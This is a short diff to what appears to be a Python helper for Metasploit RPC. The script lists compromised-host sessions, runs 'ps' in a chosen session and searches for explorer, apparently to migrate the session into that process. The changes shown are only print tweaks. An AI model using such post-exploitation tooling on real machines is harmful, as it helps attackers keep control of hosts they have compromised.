@@ -6,6 +6,7 @@ def init(client,sid):
     session.write("ps")
     sleep(5)
     success = ''
+    print("[*] Starting migration...")
     for line in session.read().split("\n"):
         #print(line)
         if "explorer" in line:
@@ -25,7 +26,7 @@ if __name__ == '__main__':
         exit()
     for id,c in client.sessions.list.items():
         print("{})".format(id),"IP: {}".format(c.get('session_host')),"| {}".format(c.get('desc')),"{}".format(c.get('arch')))
-    print("---------------------------------")
+    #print("---------------------------------")
     sid = input()
-    print("--------------------------------- \n")
+    #print("--------------------------------- \n")
     init(client,sid)
